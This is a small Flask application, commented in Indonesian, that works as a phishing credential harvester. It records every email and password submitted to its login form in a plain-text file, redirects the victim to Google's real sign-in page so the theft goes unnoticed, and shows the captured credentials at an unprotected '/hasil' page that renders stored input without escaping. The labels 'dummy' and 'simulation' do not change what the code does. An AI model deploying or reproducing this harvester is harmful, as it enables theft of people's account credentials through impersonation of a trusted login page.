from flask import Flask, render_template, request, redirect
import os

app = Flask(__name__)

# Halaman utama (login)
@app.route("/")
def index():
    return render_template("login.html")

# Proses login
@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")

    # Simpan hasil ke file
    with open("hasil_dummy.txt", "a") as f:
        f.write(f"Email: {email}, Password: {password}\n")

    # Redirect ke Google asli
    return redirect("https://accounts.google.com/signin/v2/identifier")

# Lihat hasil yang sudah masuk
@app.route("/hasil")
def hasil():
    if os.path.exists("hasil_dummy.txt"):
        with open("hasil_dummy.txt", "r") as f:
            data = f.read().replace("\n", "<br>")
    else:
        data = "Belum ada data."
    return f"<h1>Hasil Simulasi</h1><p>{data}</p>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
